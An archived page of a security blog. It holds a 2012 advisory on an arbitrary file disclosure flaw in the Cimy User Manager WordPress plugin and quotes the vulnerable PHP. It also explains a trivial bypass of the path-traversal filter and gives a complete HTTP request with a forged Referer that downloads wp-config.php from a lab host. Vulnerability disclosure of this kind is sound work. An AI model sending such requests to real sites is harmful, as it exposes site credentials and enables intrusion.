<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" lang="en-US">
<![endif]-->
<!--[if IE 7]>
<html id="ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html id="ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
<base href="http://ceriksen.com" />

<meta charset="UTF-8" />
<meta name="viewport" content="initial-scale=1.0, width=device-width" />
<title>WordPress plugin | ceriksen.com | Page 2</title>

<link rel="stylesheet" type="text/css" media="all" href="http://ceriksen.com/wp-content/themes/simplex/style.css" />

<!--[if lt IE 9]>
<script src="http://ceriksen.com/wp-content/themes/simplex/js/html5.js" type="text/javascript"></script>
<script src="http://ceriksen.com/wp-content/themes/simplex/js/css3-mediaqueries.js"></script>
<![endif]-->



<link rel='stylesheet' id='crayon-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-twilight-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/themes/twilight/twilight.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=2.5.0' type='text/css' media='all' />
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","fullscreen":"fullscreen","toggleFullscreen":"Toggle fullscreen mode","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction"};
/* ]]> */
</script>
<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/quicktags.min.js?ver=3.8.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
var CrayonTagEditorSettings = {"home_url":"http:\/\/ceriksen.com","css":"crayon-te","css_selected":"crayon-selected","code_css":"#crayon-code","url_css":"#crayon-url","url_info_css":"#crayon-te-url-info","lang_css":"#crayon-lang","title_css":"#crayon-title","mark_css":"#crayon-mark","range_css":"#crayon-range","inline_css":"crayon-inline","inline_hide_css":"crayon-hide-inline","inline_hide_only_css":"crayon-hide-inline-only","hl_css":"#crayon-highlight","switch_html":"#content-html","switch_tmce":"#content-tmce","tinymce_button":"a.mce_crayon_tinymce","submit_css":"#crayon-te-ok","cancel_css":"#crayon-te-cancel","content_css":"#crayon-te-content","dialog_title_css":"#crayon-te-title","submit_wrapper_css":"#crayon-te-submit-wrapper","data_value":"data-value","attr_sep":":","css_sep":"_","fallback_lang":"default","dialog_title_add":"Add Crayon Code","dialog_title_edit":"Edit Crayon Code","submit_add":"Add","submit_edit":"Save","bar":"#crayon-te-bar","bar_content":"#crayon-te-bar-content","extensions":{"scpt":"applescript","applescript":"applescript","swf":"as","fla":"as","cs":"c#","h":"c++","hh":"c++","hpp":"c++","hxx":"c++","h++":"c++","cc":"c++","cpp":"c++","cxx":"c++","c++":"c++","pas":"delphi","java":"java","class":"java","jar":"java","mv":"miva","mvc":"miva","mvt":"miva","m":"objc","mm":"objc","pl":"perl","py":"python","pyw":"python","pyc":"python","pyo":"python","pyd":"python","rb":"ruby","rbx":"ruby","rhtml":"ruby","vbs":"vb"}};
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='http://ceriksen.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.te.min.js?ver=2.5.0'></script>
<script type='text/javascript' src='http://ceriksen.com/wp-content/themes/simplex/lib/js/jquery.fitvids.js?ver=3.8.3'></script>

 

<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-32892239-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script>

	<script type="text/javascript">
		jQuery(document).ready(function(){
			jQuery("#page").fitVids();	 
		});
	</script>	<style type="text/css">
			#site-title a,
		#site-description {
			color: #e6941e !important;
		}
		</style>
	
</head>

<body lang="en" class="archive paged tag tag-wordpress-plugin tag-4 paged-2 tag-paged-2  single-author">
<div id="page" class="hfeed">
	<header id="branding" role="banner">
		<hgroup>
			<h1 id="site-title"><a href="http://ceriksen.com/" title="ceriksen.com" rel="home">ceriksen.com</a></h1>
			<h2 id="site-description"></h2>
						
							<form role="search" method="get" id="searchform" class="searchform" action="http://ceriksen.com/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form>					</hgroup>
		
		<nav id="access" role="navigation">
			<h2 class="assistive-text">Main menu</h2>
			<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>

			<div class="menu"><ul><li ><a href="http://ceriksen.com/">Home</a></li></ul></div>

		</nav><!-- #access -->
		<div class="clear"></div>
	</header><!-- #branding -->

	<div id="main">
		<section id="primary">
			<div id="content" role="main">

			
				<header class="page-header">
					<h2 class="page-title">
						Archives					</h2>
				</header>

				
					<nav id="nav-above">
		<h2 class="assistive-text">Post navigation</h2>

		
		
						<div class="nav-previous"><a href="http://ceriksen.com/tag/wordpress-plugin/page/3/" ><span class="meta-nav">&larr;</span> Older posts</a></div>
				
						<div class="nav-next"><a href="http://ceriksen.com/tag/wordpress-plugin/" >Newer posts <span class="meta-nav">&rarr;</span></a></div>
						
		
	
	</nav><!-- #nav-above -->
	
								
					
<article id="post-160" class="post-160 post type-post status-publish format-standard hentry category-advisories tag-cimy-user-manager tag-file-disclosure tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2012/10/24/wordpress-cimy-user-manager-arbitrary-file-disclosure/" title="10:49 am" rel="bookmark" class="entry-date"><time datetime="2012-10-24T10:49:53+00:00" pubdate>October 24, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2012/10/24/wordpress-cimy-user-manager-arbitrary-file-disclosure/" title="Permalink to WordPress Cimy User Manager arbitrary file disclosure" rel="bookmark">WordPress Cimy User Manager arbitrary file disclosure</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/50834/">Secunia Advisory SA 50834</a></p>
<p><strong>Analysis of vulnerability</strong></p>
<p>The Cimy User Manager is made to be able to export data from WordPress. The file <a href="http://plugins.svn.wordpress.org/cimy-user-manager/tags/1.4.1/cimy_user_manager.php">cimy_user_manager.php</a> has an init action which decides whether or not to download some content from the site:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a6319f146387910" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
add_action('init', 'cimy_um_download_database');

function cimy_um_download_database() {
	if (!empty($_POST["cimy_um_filename"])) {
		if (strpos($_SERVER['HTTP_REFERER'], admin_url('users.php?page=cimy_user_manager')) !== false) {
			$cimy_um_filename = $_POST["cimy_um_filename"];
			// protect from site traversing
			$cimy_um_filename = str_replace('../', '', $cimy_um_filename);
			if (!is_file($cimy_um_filename))
				return;

			header("Pragma: "); // Leave blank for issues with IE
			header("Expires: 0");
			header('Vary: User-Agent');
			header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
			header("Content-Type: text/csv");
			header("Content-Type: application/force-download");
			header("Content-Type: application/download");
			header("Content-Disposition: attachment; filename=\"".esc_html(basename($cimy_um_filename))."\";"); // cannot use esc_url any more because prepends 'http' (doh)
			header("Content-Transfer-Encoding: binary");
			header("Content-Length: ".filesize($cimy_um_filename));
			readfile($cimy_um_filename);
			exit();
		}
	}
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a6319f146387910-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6319f146387910-72">72</div><div class="crayon-num" data-line="crayon-53c9878a6319f146387910-73">73</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6319f146387910-74">74</div><div class="crayon-num" data-line="crayon-53c9878a6319f146387910-75">75</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6319f146387910-76">76</div><div class="crayon-num" data-line="crayon-53c9878a6319f146387910-77">77</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6319f146387910-78">78</div><div class="crayon-num" data-line="crayon-53c9878a6319f146387910-79">79</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6319f146387910-80">80</div><div class="crayon-num" data-line="crayon-53c9878a6319f146387910-81">81</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6319f146387910-82">82</div><div class="crayon-num" data-line="crayon-53c9878a6319f146387910-83">83</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6319f146387910-84">84</div><div class="crayon-num" data-line="crayon-53c9878a6319f146387910-85">85</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6319f146387910-86">86</div><div class="crayon-num" data-line="crayon-53c9878a6319f146387910-87">87</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6319f146387910-88">88</div><div class="crayon-num" data-line="crayon-53c9878a6319f146387910-89">89</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6319f146387910-90">90</div><div class="crayon-num" data-line="crayon-53c9878a6319f146387910-91">91</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6319f146387910-92">92</div><div class="crayon-num" data-line="crayon-53c9878a6319f146387910-93">93</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6319f146387910-94">94</div><div class="crayon-num" data-line="crayon-53c9878a6319f146387910-95">95</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a6319f146387910-96">96</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a6319f146387910-71"><span class="crayon-e">add_action</span><span class="crayon-sy">(</span><span class="crayon-s">'init'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'cimy_um_download_database'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6319f146387910-72">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a6319f146387910-73"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">cimy_um_download_database</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6319f146387910-74"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-k ">empty</span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"cimy_um_filename"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a6319f146387910-75"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">strpos</span><span class="crayon-sy">(</span><span class="crayon-v">$_SERVER</span><span class="crayon-sy">[</span><span class="crayon-s">'HTTP_REFERER'</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">admin_url</span><span class="crayon-sy">(</span><span class="crayon-s">'users.php?page=cimy_user_manager'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">!==</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6319f146387910-76"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"cimy_um_filename"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6319f146387910-77"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// protect from site traversing</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6319f146387910-78"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">'../'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6319f146387910-79"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">is_file</span><span class="crayon-sy">(</span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6319f146387910-80"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">return</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6319f146387910-81">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6319f146387910-82"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Pragma: "</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// Leave blank for issues with IE</span></div><div class="crayon-line" id="crayon-53c9878a6319f146387910-83"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Expires: 0"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6319f146387910-84"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Vary: User-Agent'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6319f146387910-85"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Cache-Control: must-revalidate, post-check=0, pre-check=0"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6319f146387910-86"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-Type: text/csv"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6319f146387910-87"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-Type: application/force-download"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6319f146387910-88"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-Type: application/download"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6319f146387910-89"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-Disposition: attachment; filename=\""</span><span class="crayon-sy">.</span><span class="crayon-e">esc_html</span><span class="crayon-sy">(</span><span class="crayon-e">basename</span><span class="crayon-sy">(</span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"\";"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// cannot use esc_url any more because prepends 'http' (doh)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6319f146387910-90"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-Transfer-Encoding: binary"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6319f146387910-91"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-Length: "</span><span class="crayon-sy">.</span><span class="crayon-e">filesize</span><span class="crayon-sy">(</span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6319f146387910-92"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">readfile</span><span class="crayon-sy">(</span><span class="crayon-v">$cimy_um_filename</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6319f146387910-93"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">exit</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6319f146387910-94"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878a6319f146387910-95"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6319f146387910-96"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0086 seconds] -->
<p>First it checks if the cimy_um_filename POST variable is set. Then it goes to check if the referer is from the admin page, which is a flawed way of authentication. But if it thinks you come from the admin page, it will attempt to protect against path traversal. It is pretty obvious that we can fake the referer header. But we can quite easily bypass the path traversal. Lets have a look at an example.</p>
<p>Take this string: &#8230;/&#8230;//<br />
Now lets see where we match ../:  .<span style="color: #ff0000;">../</span>.<span style="color: #ff0000;">../</span>/<br />
Which leaves us with: ../</p>
<p>This tells us that the path traversal &#8220;protection&#8221; on line 78 can be bypassed trivially.</p>
<p>Additionally, in the case where you&#8217;d want to obtain a wp-config.php file, which contains credentials and other very critical information about the blog, we do not need to bypass this, because when init is called, the working directory is the wordpress base folder, which contains the wp-config.php file. Here&#8217;s an example request showing how to pull the wp-config.php file:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a631bf889714464" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/ HTTP/1.0
Host: 192.168.80.130
Referer: http://192.168.80.130/wordpress/wp-admin/users.php?page=cimy_user_manager
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

cimy_um_filename=wp-config.php</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a631bf889714464-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a631bf889714464-2">2</div><div class="crayon-num" data-line="crayon-53c9878a631bf889714464-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a631bf889714464-4">4</div><div class="crayon-num" data-line="crayon-53c9878a631bf889714464-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a631bf889714464-6">6</div><div class="crayon-num" data-line="crayon-53c9878a631bf889714464-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a631bf889714464-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a631bf889714464-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878a631bf889714464-3"><span class="crayon-i">Referer</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//192.168.80.130/wordpress/wp-admin/users.php?page=cimy_user_manager</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a631bf889714464-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line" id="crayon-53c9878a631bf889714464-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">30</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a631bf889714464-6">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a631bf889714464-7"><span class="crayon-v">cimy_um_filename</span><span class="crayon-o">=</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-v">config</span><span class="crayon-sy">.</span><span class="crayon-i">php</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0021 seconds] -->
<p>&nbsp;</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/cimy-user-manager/" rel="tag">Cimy User Manager</a>, <a href="http://ceriksen.com/tag/file-disclosure/" rel="tag">File Disclosure</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2012/10/24/wordpress-cimy-user-manager-arbitrary-file-disclosure/#respond" title="Comment on WordPress Cimy User Manager arbitrary file disclosure">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-160 -->

				
					
<article id="post-176" class="post-176 post type-post status-publish format-standard hentry category-advisories tag-command-injection tag-ungallery tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2012/10/23/wordpress-ungallery-remote-command-injection-vulnerability/" title="7:06 pm" rel="bookmark" class="entry-date"><time datetime="2012-10-23T19:06:10+00:00" pubdate>October 23, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
